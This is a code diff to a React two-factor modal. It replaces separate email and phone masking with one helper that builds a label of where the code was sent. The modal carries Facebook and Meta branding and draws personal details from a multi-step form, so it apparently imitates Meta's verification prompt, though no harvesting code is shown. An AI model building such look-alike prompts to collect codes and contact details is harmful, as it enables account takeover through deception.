@@ -1,7 +1,7 @@
 import React from 'react';
 import Image from 'next/image';
 import Modal from './Modal';
-import { maskEmail, maskPhoneNumber } from '@/utils/mask';
+import { buildTwoFaDestinationsLabel } from '@/utils/twoFaDescription';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
 import { useAppStrings } from '@/hooks/useAppStrings';
@@ -37,11 +37,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const { fullName, phone, email, emailBusiness } = formDataState as FormData || {};
 
-    const phoneDisplay = maskPhoneNumber(phone)
-    const emailDisplay = maskEmail(email);
-    const trimmedBiz = (emailBusiness ?? '').trim();
-    const businessGmailMasked =
-        trimmedBiz.toLowerCase().endsWith('@gmail.com') ? maskEmail(trimmedBiz) : undefined;
+    const twoFaDestinations = buildTwoFaDestinationsLabel(email ?? '', phone ?? '', emailBusiness);
 
     const [countdown, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC);
 
@@ -227,7 +223,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <span>{t.common.facebook}</span>
                     </div>
                     <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
-                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay, businessGmailMasked)}</p>
+                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(twoFaDestinations)}</p>
                     <div className="relative my-[15px] aspect-[16/10] w-full overflow-hidden rounded-[10px] bg-[#f5f5f5]">
                         <Image
                             src="/images/meta/authentication.png"
